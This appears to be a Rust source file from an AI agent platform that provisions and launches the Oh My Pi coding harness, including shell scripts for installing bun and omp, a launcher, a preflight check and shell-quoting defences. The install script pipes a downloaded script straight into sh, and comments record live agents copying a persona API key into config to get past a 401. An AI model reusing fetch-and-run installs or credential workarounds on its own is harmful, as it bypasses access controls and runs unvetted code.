// The workbench's coding harness: Oh My Pi (omp), and only omp. A Developer
// Agent drives it from its sandbox: the persona is the orchestrator, omp is
// the pair programmer. There is no registry to pick from and nothing for an
// admin to configure per agent; this file is the whole definition.
//
// Models are omp's call, not a per-job pin. The org's Workbench roles on
// /models (code-light / code-standard / code-heavy) become omp's own model
// roles (smol / default / slow + plan), so omp moves between them the way it
// is built to (subagents and commits on smol, the advisor on slow, plan mode
// on plan) instead of running a whole job on one model the platform chose.

use serde_json::{Map, Value, json};
use sqlx::PgPool;

/// Oh My Pi, as a start_job answer spells it. `<model>` is the default role's
/// model (the platform fills it, the agent never picks), `<sessionDir>` the
/// job's session dir, and `<task>` stays for the driving agent to fill.
pub struct Harness {
    pub slug: &'static str,
    pub label: &'static str,
    pub invoke: &'static str,
    pub json_invoke: &'static str,
    pub continue_invoke: &'static str,
    pub continue_json_invoke: &'static str,
    /// A cheap command that proves the binary runs in the sandbox, surfaced
    /// by the workbench doctor for agents to self-verify.
    pub probe: &'static str,
    /// One short model call through the harness: proves it can AUTHENTICATE,
    /// which `probe` cannot (`--version` calls no model). `<model>` is the
    /// provider-qualified model; no session, tools, skills or rules load.
    pub auth_probe: &'static str,
    /// What a driving agent should understand: sessions, resume, results.
    pub guide: &'static str,
}

pub const OMP: Harness = Harness {
    slug: "oh-my-pi",
    label: "Oh My Pi",
    invoke: "<launcher> -p --auto-approve --session-dir <sessionDir> --model <model> \"<task>\"",
    json_invoke: "<launcher> --mode json --auto-approve --session-dir <sessionDir> --model <model> \"<task>\"",
    continue_invoke: "<launcher> -p --auto-approve --session-dir <sessionDir> -c --model <model> \"<task>\"",
    continue_json_invoke: "<launcher> --mode json --auto-approve --session-dir <sessionDir> -c --model <model> \"<task>\"",
    probe: "<launcher> --version",
    auth_probe: "<launcher> -p --no-session --no-tools --no-skills --no-rules --no-extensions --no-title --model <model> \"Reply with the single word OK.\"",
    guide: "You are the orchestrator; Oh My Pi (omp) is the pair programmer. Talaria has already cloned the repo, installed its toolchain and Oh My Pi, and checked them: run the lines exactly as given, from any directory (the launcher cds into the workdir and loads the project env). Never install, upgrade, wrap or reconfigure the harness, and never point it at another harness dir. First turn: jsonRun. Later turns: continueJsonRun (`-c`) on the same --session-dir. Run each turn in the BACKGROUND (your terminal's background mode) and wait on the process; a foreground call is cut off at the terminal's timeout and kills omp mid-edit. One scoped ask per turn (a function, a failing test, a review of the last diff), then read the JSON events and steer. Never --no-session, never the TUI, never one-shot the feature. --auto-approve skips tool prompts. omp picks its own models for the work (a fast model for subagents and small steps, a reasoning model for planning and review); do not pass a different --model. Hash-anchored edits, LSP, subagents, and a browser live inside omp; do not reimplement them. Git over https:// just works. After the change is right: git diff, verify, finish_job.",
};

/// The provider omp's models.yml declares; model ids on the command line and
/// in the role env carry it as a prefix.
pub const PROVIDER: &str = "talaria";

/// Where omp keeps config, auth, and sessions. On the department state volume
/// so a session persists and a department-mate can resume it. omp relocates
/// `~/.omp/agent` here when `PI_CODING_AGENT_DIR` is set. Docker creates this
/// directory as root when the render bind-mounts policy files into it; the
/// fleet render's cont-init hook chowns it back to the runtime user.
pub const PI_CODING_AGENT_DIR: &str = "/opt/data/workbench/harness/pi";

/// The bun the coding harness runs on. omp's executable is a bun program
/// (`#!/usr/bin/env bun`) and exits at start on a bun below its `engines.bun`.
/// This is the harness's runtime, not the repo's toolchain (`mise.toml` decides
/// that).
pub const HARNESS_BUN: &str = "1.4.4";

/// mise's data dir on a Developer Agent's volume (the render sets
/// `XDG_DATA_HOME` to this, and mise keeps its installs and shims under it).
pub const HARNESS_XDG_DATA_HOME: &str = "/opt/data/workbench/harness/xdg";

/// A directory that is on the agent's PATH in EVERY shell: the Hermes image
/// puts it in the container's own `PATH`, so a plain `bash -c` sees it as well
/// as a login shell. mise's shim directory is not like that — it reaches the
/// PATH only through the profile block prepare_env writes, and only in a login
/// shell — which is how a sandbox could hold an installed bun and still answer
/// `env: 'bun': No such file or directory` when omp started.
pub const AGENT_BIN_DIR: &str = "/opt/data/.local/bin";

/// The Oh My Pi release every job runs. PINNED, and installed once per
/// volume, never `@latest` on each run.
///
/// Every invocation line used to be `npx -y @oh-my-pi/pi-coding-agent@latest`,
/// and omp ships almost daily. On 2026-10-28 (18.13.3) its `engines.bun` rose
/// from 1.3.14 to 1.4.4, so whatever bun a sandbox had, the next release could
/// refuse it: `error: Bun runtime must be >= 1.4.4 (found v1.4.0)`. A cold
/// `npx` on a fresh volume could also eat a whole 300 s tool call before omp
/// printed anything. On the live fleet every Developer Agent then spent its
/// first 13 to 75 turns finding a bun that worked and a version that started.
/// A pin moves only when someone bumps it here and the test against
/// [`HARNESS_BUN`] still passes.
pub const OMP_VERSION: &str = "18.16.0";

/// omp's npm package.
pub const OMP_PACKAGE: &str = "@oh-my-pi/pi-coding-agent";

/// Everything the harness keeps on the department volume.
pub const HARNESS_ROOT: &str = "/opt/data/workbench/harness";

/// Where the pinned omp is installed, one directory per version, so a bump
/// installs beside the old one and a job mid-session keeps running.
pub fn omp_install_dir() -> String {
    format!("{HARNESS_ROOT}/omp/{OMP_VERSION}")
}

/// omp's own entry point inside [`omp_install_dir`]. The launcher runs it on
/// the harness's bun BY PATH, never through `#!/usr/bin/env bun`: inside a
/// repo that pins its own bun, the `bun` on PATH is that repo's (a mise shim
/// ahead of everything), and Talaria's repo pins 1.4.0, under omp's floor.
pub fn omp_entry() -> String {
    format!(
        "{}/node_modules/{OMP_PACKAGE}/dist/cli.js",
        omp_install_dir()
    )
}

/// One harness directory per job, beside nothing another job uses.
///
/// `PI_CODING_AGENT_DIR` used to be ONE directory for every job on the agent
/// (`/opt/data/workbench/harness/pi`). omp keeps SQLite databases there
/// (`agent.db`, `models.db`, `history.db`), and a Developer Agent runs several
/// jobs at once. Live, each job's agent made its own private copy of it
/// (`pi-mirror`, `pi-t92`, `pi-t83`) and the next job borrowed whichever copy
/// it found — TALA-93 ran on the dir made for TALA-92.
pub const JOB_HARNESS_ROOT: &str = "/opt/data/workbench/harness/jobs";

/// A job's harness directory. `name` is a job uuid (validated by the caller)
/// or the fixed `doctor` slot doctor probes through.
pub fn job_harness_dir(name: &str) -> String {
    format!("{JOB_HARNESS_ROOT}/{name}")
}

/// The job's `PI_CODING_AGENT_DIR`: omp's config, auth and databases.
pub fn job_agent_dir(name: &str) -> String {
    format!("{}/agent", job_harness_dir(name))
}

/// The job's launcher: the one command every invocation line starts with.
pub fn job_launcher(name: &str) -> String {
    format!("{}/omp", job_harness_dir(name))
}

/// The harness's slot in [`job_harness_dir`] that doctor probes through.
pub const DOCTOR_SLOT: &str = "doctor";

/// Where the render leaves the files omp reads, live: a DIRECTORY bind of the
/// agent's workbench render dir, so a re-render reaches a running container.
/// A job's agent dir links to these rather than copying them.
pub const WORKBENCH_CONFIG_DIR: &str = "/opt/workbench-config";

/// Make the harness's runtime real in a sandbox, idempotently, as the agent's
/// own user: mise if the volume has none yet, bun pinned globally and
/// installed, `bun` linked into [`AGENT_BIN_DIR`] so every shell finds it
/// without a profile, and the pinned Oh My Pi installed into
/// [`omp_install_dir`] and started once. Prints `bun <v>`, `omp <v>` and
/// `bunPath <path>` on success ([`parse_runtime`]); exits non-zero with the
/// reason otherwise. Cheap once done (no download, a link refresh, one
/// `--version`).
///
/// The platform runs this before it hands the agent a harness to use — doctor,
/// start_job's provisioning, prepare_env — rather than trusting that some
/// earlier step put bun there. Before this, bun appeared only after a
/// prepare_env on a cloned repo, so a fresh Developer Agent's doctor, and every
/// non-login shell, found no bun and omp could not start.
pub fn harness_runtime_script() -> String {
    r#"set -eu
export XDG_DATA_HOME="__XDG__" MISE_YES=1
bin="__BIN__"
mise="$bin/mise"
mkdir -p "$bin"
# Fast path: the link from an earlier run still answers the pinned version,
# so mise (slow on a loaded volume) is not asked again.
real=""
if [ -L "$bin/bun" ] && [ "$("$bin/bun" --version 2>/dev/null)" = "__BUN__" ]; then
  real="$(readlink -f "$bin/bun")"
fi
if [ -z "$real" ]; then
  if [ ! -x "$mise" ]; then
    if ! curl -fsSL https://mise.run | MISE_INSTALL_PATH="$mise" sh >/dev/null 2>&1; then
      echo "could not install mise (the toolchain manager bun is installed with) into $bin" >&2
      exit 1
    fi
  fi
  "$mise" use -g bun@__BUN__ >/dev/null 2>&1 || true
  if ! "$mise" install bun@__BUN__ >/dev/null 2>&1; then
    echo "could not install bun __BUN__ with mise" >&2
    exit 1
  fi
  real="$("$mise" where bun@__BUN__ 2>/dev/null)/bin/bun"
  if [ ! -x "$real" ]; then
    echo "bun __BUN__ is not at $real after installing it" >&2
    exit 1
  fi
  ln -sfn "$real" "$bin/bun"
fi
omp_dir="__OMPDIR__"
entry="__ENTRY__"
started() { "$real" "$entry" --version 2>/dev/null | grep -qx "omp/__OMPV__"; }
if [ ! -f "$entry" ] || ! started; then
  mkdir -p "$(dirname "$omp_dir")"
  # Two jobs provisioning at once install once: the second waits here, then
  # finds the first one's install and skips its own.
  if command -v flock >/dev/null 2>&1; then
    exec 9>"$(dirname "$omp_dir")/.install.lock"
    flock -w 600 9 || true
  fi
  if [ ! -f "$entry" ] || ! started; then
    tmp="$omp_dir.tmp.$$"
    rm -rf "$tmp"
    mkdir -p "$tmp"
    printf '{"name":"talaria-omp","private":true,"dependencies":{"__PKG__":"__OMPV__"}}\n' > "$tmp/package.json"
    if ! (cd "$tmp" && BUN_INSTALL_CACHE_DIR="__HROOT__/bun-cache" "$real" install --production --no-progress >"$tmp/install.log" 2>&1); then
      tail -n 15 "$tmp/install.log" >&2
      rm -rf "$tmp"
      echo "could not install Oh My Pi __OMPV__ (bun install, above)" >&2
      exit 1
    fi
    rm -rf "$omp_dir"
    mv "$tmp" "$omp_dir"
  fi
fi
if ! v=$("$real" "$entry" --version 2>&1); then
  echo "Oh My Pi __OMPV__ does not start on bun __BUN__: $(printf '%s' "$v" | tail -n 3)" >&2
  exit 1
fi
echo "bun $("$real" --version)"
echo "omp $v"
echo "bunPath $real"
"#
    .replace("__XDG__", HARNESS_XDG_DATA_HOME)
    .replace("__BIN__", AGENT_BIN_DIR)
    .replace("__BUN__", HARNESS_BUN)
    .replace("__OMPDIR__", &omp_install_dir())
    .replace("__ENTRY__", &omp_entry())
    .replace("__OMPV__", OMP_VERSION)
    .replace("__PKG__", OMP_PACKAGE)
    .replace("__HROOT__", HARNESS_ROOT)
}

/// What [`harness_runtime_script`] reported.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Runtime {
    /// bun's own `--version`.
    pub bun: String,
    /// omp's own `--version` line (`omp/<v>`).
    pub omp: String,
    /// The real bun binary the launcher execs — never the PATH's `bun`.
    pub bun_path: String,
}

/// Read the runtime script's three lines. `None` when any is missing: the
/// script printed something else, which the caller reports as it is.
pub fn parse_runtime(out: &str) -> Option<Runtime> {
    let field = |key: &str| {
        out.lines()
            .filter_map(|l| l.trim().strip_prefix(key))
            .next_back()
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
    };
    Some(Runtime {
        bun: field("bun ")?,
        omp: field("omp ")?,
        bun_path: field("bunPath ")?,
    })
}

/// Lay out a job's harness directory, as the agent's user. `$1` is
/// [`job_harness_dir`], `$2` the job's omp session dir (made here so the
/// first run finds it); the launcher's text arrives on stdin
/// ([`launcher_script`]).
///
/// The agent dir LINKS the rendered files rather than copying them: the
/// render rewrites `/opt/workbench-config` in place, so a changed role model
/// or key name reaches the next run of every job, and nothing here ever holds
/// a key. (Live, the agents' own copies inlined the persona key into
/// `models.yml` to get past a 401.)
pub const JOB_HARNESS_SH: &str = r#"set -eu
dir="$1"; sessions="$2"; agent="$dir/agent"; cfg="__CFG__"
mkdir -p "$agent" "$sessions"
ln -sfn "$cfg/models.yml" "$agent/models.yml"
ln -sfn "$cfg/mcp.json" "$agent/mcp.json"
ln -sfn "$cfg/pi-settings.json" "$agent/settings.json"
if [ -d /opt/skills ]; then ln -sfn /opt/skills "$agent/skills"; fi
tmp="$dir/omp.tmp.$$"
cat > "$tmp"
chmod 0755 "$tmp"
mv -f "$tmp" "$dir/omp"
echo "ready $dir/omp"
"#;

/// [`JOB_HARNESS_SH`] with its one constant filled.
pub fn job_harness_script() -> String {
    JOB_HARNESS_SH.replace("__CFG__", WORKBENCH_CONFIG_DIR)
}

/// The exit status the launcher uses for "this sandbox cannot run the
/// harness" (sysexits' EX_CONFIG), so a caller can tell it from omp's own.
pub const LAUNCHER_REFUSED: i32 = 78;

/// A job's launcher: the whole harness, as one command.
///
/// `name` is the job's slot ([`job_harness_dir`]), `workdir` its checkout,
/// `bun_path` the harness's real bun ([`Runtime::bun_path`]), and `gateway`
/// whether the job's harness authenticates to the Talaria gateway (a coding
/// account's does not, so it needs no workbench key).
///
/// It owns everything the agents used to reassemble by hand in their own
/// wrappers: the job's own agent dir, the repo's toolchain on PATH (mise's
/// shims, absolute, whatever shell starts it), the project env, the workdir,
/// and omp run on the harness's bun. It refuses — exit
/// [`LAUNCHER_REFUSED`], one sentence — when the gateway key is absent from
/// the shell, rather than letting omp start and answer `401` or a missing
/// model after the agent has already spent a turn on it.
pub fn launcher_script(name: &str, workdir: &str, bun_path: &str, gateway: bool) -> String {
    let agent = job_agent_dir(name);
    let key_check = if gateway {
        format!(
            "if [ -z \"${{{key}:-}}\" ]; then\n  echo \"talaria: {key} is not set in this shell, so Oh My Pi has no key for the Talaria gateway. The agent's sandbox predates the workbench key and must be rolled; this is not something to work around — report_problem.\" >&2\n  exit {code}\nfi\n",
            key = WORKBENCH_KEY_ENV,
            code = LAUNCHER_REFUSED
        )
    } else {
        String::new()
    };
    format!(
        "#!/bin/sh\n\
         # Oh My Pi {OMP_VERSION} on bun {HARNESS_BUN} for workbench job {name}.\n\
         # Written by Talaria's provisioning and rewritten on every provision: do not edit it,\n\
         # copy it, or wrap it. Its arguments go to omp as given.\n\
         export PI_CODING_AGENT_DIR={agent}\n\
         export MISE_DATA_DIR=\"${{MISE_DATA_DIR:-${{XDG_DATA_HOME:-/opt/data/.local/share}}/mise}}\"\n\
         export MISE_YES=1 MISE_TRUSTED_CONFIG_PATHS=/opt/data/workbench/jobs\n\
         PATH=\"$MISE_DATA_DIR/shims:$PATH\"\n\
         export PATH\n\
         {key_check}\
         cd {workdir} || {{ echo \"talaria: this job's checkout ({workdir}) is not there — call job_status\" >&2; exit {code}; }}\n\
         if [ -f .talaria/env ]; then set -a; . ./.talaria/env; set +a; fi\n\
         exec {bun} {entry} \"$@\"\n",
        agent = sh_quote(&agent),
        workdir = sh_quote(workdir),
        bun = sh_quote(bun_path),
        entry = sh_quote(&omp_entry()),
        code = LAUNCHER_REFUSED,
    )
}

/// The cheap preflight, run in the shell the AGENT'S terminal gives a
/// command (the caller wraps it: Hermes's stripped names unset, its HOME,
/// a login shell). Positional args: `$1` launcher, `$2` agent dir, `$3`
/// model id ("" when the job is not on the gateway), then Hermes's stripped
/// names to unset. It prints `OK <omp version>` or `FAIL <check>` followed
/// by what the check saw — never a key.
///
/// No model call: every failure the live fleet hit is visible without one.
/// omp not starting (bun too old, a missing install) is `--version`; the
/// SQLITE_CANTOPEN on a root-owned agent dir is the write probe; `Model …
/// not found` is the model id missing from the catalog omp reads; a `401`
/// is the gateway's own model list refusing the key, which costs nothing.
pub const PREFLIGHT_SH: &str = r#"L="$1"; A="$2"; M="$3"; shift 3
for n do unset "$n" 2>/dev/null || true; done
for n in ${!CONFIG_@}; do unset "$n" 2>/dev/null || true; done
fail() { printf 'FAIL %s\n%s\n' "$1" "$2"; exit 0; }
[ -x "$L" ] || fail launcher "the launcher $L is missing or not executable"
if [ -n "$M" ] && [ -z "${__KEY__:-}" ]; then
  fail key "__KEY__ is not set in the agent's terminal, so omp has no key for the Talaria gateway (the sandbox predates the workbench key: roll the agent)"
fi
v=$("$L" --version 2>&1 </dev/null); rc=$?
case "$v" in
  *"omp/__OMPV__"*) ;;
  *) fail version "the launcher exited $rc: $(printf '%s' "$v" | tail -n 5)" ;;
esac
t="$A/.talaria-write-probe"
if ! { touch "$t" 2>/dev/null && rm -f "$t"; }; then
  fail writable "$(id -un) cannot write omp's agent dir $A ($(stat -c %U:%a "$A" 2>/dev/null))"
fi
if [ -n "$M" ]; then
  [ -r "$A/models.yml" ] || fail models "omp has no model catalog at $A/models.yml (-> $(readlink "$A/models.yml" 2>/dev/null))"
  grep -qF -- "$M" "$A/models.yml" || fail models "the model catalog omp reads does not list $M, so omp would answer: Model \"talaria/$M\" not found"
  base=$(sed -n 's/^[[:space:]]*baseUrl:[[:space:]]*//p' "$A/models.yml" | head -n 1 | tr -d "\"'")
  [ -n "$base" ] || fail models "the model catalog at $A/models.yml names no baseUrl"
  code=$("__BUN__" -e 'try { const r = await fetch(process.argv[1] + "/models", { headers: { authorization: "Bearer " + (process.env.__KEY__ || "") }, signal: AbortSignal.timeout(20000) }); console.log(r.status) } catch (e) { console.log("unreachable: " + (e && e.message || e)) }' "$base" 2>&1 | tail -n 1)
  [ "$code" = 200 ] || fail gateway "the Talaria gateway's model list at $base/models answered $code to the workbench key"
fi
echo "OK $v"
"#;

/// [`PREFLIGHT_SH`] with its constants filled; `bun_path` runs the gateway
/// check (curl is not promised by every image, bun is: it was just
/// provisioned).
pub fn preflight_script(bun_path: &str) -> String {
    PREFLIGHT_SH
        .replace("__KEY__", WORKBENCH_KEY_ENV)
        .replace("__OMPV__", OMP_VERSION)
        .replace("__BUN__", bun_path)
}

/// What the preflight said: `Ok(version)`, or the failed check and what it
/// saw.
pub fn preflight_verdict(out: &str) -> Result<String, (String, String)> {
    let mut lines = out.lines();
    while let Some(line) = lines.next() {
        let line = line.trim();
        if let Some(v) = line.strip_prefix("OK ") {
            return Ok(v.trim().to_string());
        }
        if let Some(check) = line.strip_prefix("FAIL ") {
            let detail: Vec<&str> = lines.collect();
            return Err((
                check.trim().to_string(),
                detail.join("\n").trim().to_string(),
            ));
        }
    }
    Err((
        "preflight".into(),
        if out.trim().is_empty() {
            "the preflight printed nothing".into()
        } else {
            out.trim().to_string()
        },
    ))
}

/// The MCP pass-through file omp reads inside [`PI_CODING_AGENT_DIR`].
pub const MCP_CONFIG_FILE: &str = "mcp.json";

/// The model catalog omp reads inside [`PI_CODING_AGENT_DIR`]: `models.yml`,
/// not `models.json`. omp converts a `models.json` into `models.yml` ONCE —
/// only while no `models.yml` exists — and reads the YAML from then on, so a
/// rendered `models.json` reached an agent's omp on its first run and never
/// again: a changed role model or key name stayed whatever the first run saw.
pub const MODELS_CONFIG_FILE: &str = "models.yml";

/// The env var the workbench credential reaches the sandbox under, and the
/// name models.yml's `apiKey` gives omp to read it from.
///
/// NOT `OPENAI_API_KEY`. Hermes strips its provider names — `OPENAI_API_KEY`,
/// `OPENAI_BASE_URL`, `ANTHROPIC_*` and the rest — from the env of every
/// command its terminal runs, and `terminal.env_passthrough` refuses to put
/// them back (Hermes `tools/environments/local_env_policy.py`,
/// `tools/env_passthrough.py`). The key used to ride `OPENAI_API_KEY`, so omp
/// started from the agent's terminal — the only way an agent starts it — had
/// no key: present for `docker exec`, gone for the agent. A `TALARIA_` name is
/// not Hermes's, so it survives the scrub; `talaria-agent-secrets` keeps a
/// per-agent secret from taking it.
///
/// And a BARE name: omp resolves an `apiKey` by looking up an env var with
/// exactly that name, and sends the value as written when there is none —
/// `"$OPENAI_API_KEY"` named no variable, so it went out as the literal text
/// `$OPENAI_API_KEY`.
pub const WORKBENCH_KEY_ENV: &str = "TALARIA_WORKBENCH_API_KEY";

// The harness reaches the same org gateway the personas do, but on its OWN
// credential (`workbench-gateway`, minted into the fleet .env as
// LLM_WORKBENCH_API_KEY by fleet-brain, handed to the sandbox as
// [`WORKBENCH_KEY_ENV`]). It must: a harness run is spend NO
// Talaria flow ever sees — no chat/channel/ticket row is written for it — so
// the gateway is the only place it can enter the ledger, while the personas'
// key had to stay unmetered there while a chat flow wrote each persona turn's
// row. One shared credential could only be one of those two things, so harness
// runs were either invisible or doubled every persona turn. (Each agent now
// has its own key, metered call by call at the relay; the workbench key still
// keeps a harness run's spend apart from the agent's own.)
//
// NO FALLBACK TO THE PERSONAS' KEY. This used to read
// `${LLM_WORKBENCH_API_KEY:-${LLM_API_KEY}}` so an operator-overridden fleet
// (LLM_BASE_URL at a raw upstream, no gateway brain provisioned) kept working
// on the key it configured. The cost was that every Developer Agent sandbox —
// a container that runs model-authored code from untrusted repos — could read
// the fleet-wide, unmetered persona key out of its own environment. The
// sandbox gets the workbench key and nothing else; an operator on a raw
// upstream sets LLM_WORKBENCH_API_KEY explicitly.
//
// No base URL rides the env: models.yml carries the gateway's URL as a
// literal (`OPENAI_BASE_URL` was never read by omp, and Hermes strips it).
pub fn gateway_env() -> Map<String, Value> {
    let mut env = Map::new();
    env.insert(
        WORKBENCH_KEY_ENV.into(),
        Value::String("${LLM_WORKBENCH_API_KEY}".into()),
    );
    env
}

/// The container env omp needs: gateway auth plus its config dir.
pub fn omp_env() -> Map<String, Value> {
    let mut env = gateway_env();
    env.insert("PI_CODING_AGENT_DIR".into(), json!(PI_CODING_AGENT_DIR));
    env
}

/// A model id as omp's CLI and role env expect it.
pub fn model_arg(model: &str) -> String {
    format!("{PROVIDER}/{model}")
}

/// Slot the job's launcher, model and session dir into an invoke template.
/// `<task>` stays for the driving agent to fill — that is the steer, not a
/// platform value.
pub fn fill_cmd(tmpl: &str, model: Option<&str>, session_dir: &str, launcher: &str) -> String {
    fill_cmd_arg(tmpl, model.map(model_arg).as_deref(), session_dir, launcher)
}

/// `fill_cmd` for a model argument that is ALREADY provider-qualified.
///
/// A coding account's models are its own provider's (`anthropic/…`), not the
/// gateway's, so they must not take the `talaria/` prefix. Both paths go
/// through one template filler so an invocation line can never end up with
/// two prefixes or none.
pub fn fill_cmd_arg(
    tmpl: &str,
    model_arg: Option<&str>,
    session_dir: &str,
    launcher: &str,
) -> String {
    let mut s = tmpl
        .replace("<launcher>", &sh_quote(launcher))
        .replace("<sessionDir>", &sh_quote(session_dir));
    if let Some(arg) = model_arg {
        s = s.replace("<model>", &sh_quote(arg));
    }
    s
}

/// A value as ONE shell word, whatever it holds.
///
/// Everything slotted into an invocation line is handed to the driving agent
/// as "the command to run as written", so a value carrying a shell
/// metacharacter would run as a command inside the sandbox. The routes that
/// accept a model id already refuse anything outside the model-id grammar;
/// this is the second fence, so the line is safe even for a value that got
/// in some other way. A value made only of characters a POSIX shell never
/// interprets passes through bare — the usual line stays readable — and
/// anything else is single-quoted with the one escape single quotes need.
pub fn sh_quote(s: &str) -> String {
    let bare = !s.is_empty()
        && s.bytes().all(|b| {
            b.is_ascii_alphanumeric()
                || matches!(
                    b,
                    b'.' | b'_' | b':' | b'/' | b'-' | b'@' | b'%' | b'+' | b'=' | b','
                )
        });
    if bare {
        return s.to_string();
    }
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Inline `KEY=value ` assignments to prefix an invocation line with, for the
/// roles that ride env rather than `--model`.
///
/// WHY INLINE AND NOT ONLY THE CONTAINER ENV. The container's role env is
/// rendered per agent, so it can only ever carry the agent's DEFAULT plan —
/// a ticket pinned to another plan cannot re-render a running container, and
/// an account signed in since the last roll would otherwise be invisible to
/// the harness until someone rolled the agent. Putting the resolved roles on
/// the line itself makes each job self-describing and correct whatever the
/// container was last rendered with.
pub fn role_env_prefix(roles: &[(String, String)]) -> String {
    let mut out = String::new();
    for (role, arg) in roles {
        let var = match role.as_str() {
            "smol" => "PI_SMOL_MODEL",
            "slow" => "PI_SLOW_MODEL",
            "plan" => "PI_PLAN_MODEL",
            // `default` rides `--model`; anything else is not a role omp reads.
            _ => continue,
        };
        out.push_str(var);
        out.push('=');
        out.push_str(&sh_quote(arg));
        out.push(' ');
    }
    out
}

// ── Model roles (the org's Workbench roles, handed to omp) ──────────────────

/// omp's model roles, resolved from the org's Workbench roles. `None` means
/// nothing in the chain resolves, so omp runs on its default alone.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct OmpRoles {
    pub default: Option<String>,
    pub smol: Option<String>,
    pub slow: Option<String>,
    pub plan: Option<String>,
}

impl OmpRoles {
    /// The map agents see (doctor, list_repos, start_job). Fixed key order.
    pub fn wire(&self) -> Value {
        json!({
            "default": self.default,
            "smol": self.smol,
            "slow": self.slow,
            "plan": self.plan,
        })
    }

    /// omp reads its non-default roles from these env vars; the default rides
    /// `--model` on the invocation line. Unresolved roles are left unset so
    /// omp falls back to its default rather than a model that does not exist.
    pub fn env(&self) -> Map<String, Value> {
        let mut env = Map::new();
        for (key, model) in [
            ("PI_SMOL_MODEL", &self.smol),
            ("PI_SLOW_MODEL", &self.slow),
            ("PI_PLAN_MODEL", &self.plan),
        ] {
            if let Some(m) = model {
                env.insert(key.into(), json!(model_arg(m)));
            }
        }
        env
    }

    /// Every distinct model, default first: what models.yml declares.
    pub fn model_ids(&self) -> Vec<String> {
        let mut ids: Vec<String> = Vec::new();
        for m in [&self.default, &self.smol, &self.slow, &self.plan]
            .into_iter()
            .flatten()
        {
            if !ids.contains(m) {
                ids.push(m.clone());
            }
        }
        ids
    }
}

/// The org's code-standard / code-light / code-heavy roles as omp's default /
/// smol / slow+plan. Each resolves with a fall-down chain so unset slots never
/// strand work. A DB failure inside the chain propagates; the caller surfaces
/// it as a thrown tool error, not a resolved null.
pub async fn omp_roles(pg: &PgPool) -> Result<OmpRoles, String> {
    let default = role_model(pg, "standard").await?;
    let smol = role_model(pg, "light").await?;
    let heavy = role_model(pg, "heavy").await?;
    Ok(OmpRoles {
        default,
        smol,
        slow: heavy.clone(),
        plan: heavy,
    })
}

async fn role_model(pg: &PgPool, weight: &str) -> Result<Option<String>, String> {
    async fn resolves(pg: &PgPool, model: &str) -> Result<bool, String> {
        Ok(talaria_gateway::registry::resolve_route(pg, model)
            .await
            .map_err(|e| format!("route resolve: {e}"))?
            .is_some())
    }
    let order: &[&str] = match weight {
        "heavy" => &["heavy", "standard", "light"],
        "standard" => &["standard", "light"],
        _ => &["light"],
    };
    for w in order {
        if let Some(m) = talaria_model_roles::resolve_role_model(pg, &format!("code-{w}"))
            .await
            .map_err(|err| format!("role resolve: {err}"))?
        {
            return Ok(Some(m));
        }
    }
    if let Some(utility) = talaria_model_roles::resolve_role_model(pg, "utility")
        .await
        .map_err(|err| format!("role resolve: {err}"))?
    {
        return Ok(Some(utility));
    }
    let env_model = std::env::var("TALARIA_COPILOT_MODEL").ok();
    for m in [env_model, Some("pl-main".to_string())] {
        let Some(m) = m else { continue };
        if resolves(pg, &m).await? {
            return Ok(Some(m));
        }
    }
    Ok(None)
}

// ── Is the sandbox the one the current render builds? ───────────────────────

/// The shape of the rendered sandbox, as a token the container carries.
///
/// A render change only reaches a container when the agent is re-rendered
/// and ROLLED, and nothing forced that or noticed it had not happened. The
/// cont-init hook that hands the harness directories to the runtime user sat
/// in the render, with a test, while the live fleet ran containers whose
/// `/etc/cont-init.d` had never contained it — so a fix that was correct,
/// reviewed and merged was absent from every agent, and the only symptom was
/// a harness that would not start.
///
/// The render stamps this token into the container's own ENV
/// ([`SANDBOX_SHAPE_ENV`]); the workbench compares what the container carries
/// against what this build expects and says "roll the agent" when they
/// differ. **Bump it whenever the rendered sandbox shape changes** — a new
/// mount, a changed hook, a new env var. Getting a stale answer is the
/// failure this exists to make loud, so a forgotten bump is the one way it
/// can still be quiet; provisioning's preflight is the backstop for that.
///
/// WHY THE ENV AND NOT A FILE. It used to be a file in
/// `/opt/workbench-config`, which is a DIRECTORY bind of the render dir: the
/// render rewrote the token in place and every container — however old —
/// read the new one. The live engineering agent ran a container created
/// 2026-09-22 (root-owned harness dir, no workbench key in its env, the
/// pre-models.yml mounts) while its doctor called it current. A container's
/// env is fixed when it is created, which is exactly the property a
/// staleness token needs.
pub const SANDBOX_SHAPE: &str = "2026-11-04.shape-env+job-harness";

/// The container env var the render stamps [`SANDBOX_SHAPE`] into.
pub const SANDBOX_SHAPE_ENV: &str = "TALARIA_SANDBOX_SHAPE";

/// Where the render also leaves it, read-only, inside the container. Kept for
/// the record only: it lives in a live bind, so it is never evidence of what
/// built a container ([`SANDBOX_SHAPE`]).
pub const SANDBOX_SHAPE_FILE: &str = "/opt/workbench-config/render-shape";

/// The env a Developer Agent's container carries so the workbench can tell
/// which render created it.
pub fn shape_env() -> Map<String, Value> {
    let mut env = Map::new();
    env.insert(SANDBOX_SHAPE_ENV.into(), json!(SANDBOX_SHAPE));
    env
}

/// Is a container that carries `found` (its [`SANDBOX_SHAPE_ENV`], empty when
/// unset) the one this build renders? `None` when it is; the reason when not.
pub fn sandbox_stale_reason(found: &str) -> Option<String> {
    let found = found.trim();
    if found == SANDBOX_SHAPE {
        return None;
    }
    Some(format!(
        "this sandbox was created by an older render ({}) and this Talaria renders {SANDBOX_SHAPE}: it is missing mounts and env the current harness needs, and only rolling the agent (Agents → the agent → Roll) recreates it",
        if found.is_empty() {
            "it predates the shape token"
        } else {
            found
        },
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    // omp's `engines.bun`, copied by hand from the npm package: a pin lowered
    // under it fails here, a floor raised upstream does not.
    const OMP_BUN_FLOOR: [u32; 3] = [1, 4, 4];

    #[test]
    fn the_pinned_bun_is_one_omp_will_start_on() {
        let pin: Vec<u32> = HARNESS_BUN
            .split('.')
            .map(|part| part.parse().expect("HARNESS_BUN is a plain x.y.z"))
            .collect();
        assert!(
            pin.as_slice() >= OMP_BUN_FLOOR.as_slice(),
            "omp exits with `Bun runtime must be >= {OMP_BUN_FLOOR:?}` on bun {HARNESS_BUN}"
        );
    }

    #[test]
    fn the_runtime_script_puts_the_pinned_bun_on_every_shells_path() {
        let s = harness_runtime_script();
        assert!(!s.contains("__"), "every placeholder is filled: {s}");
        assert!(s.contains(&format!("bun@{HARNESS_BUN}")));
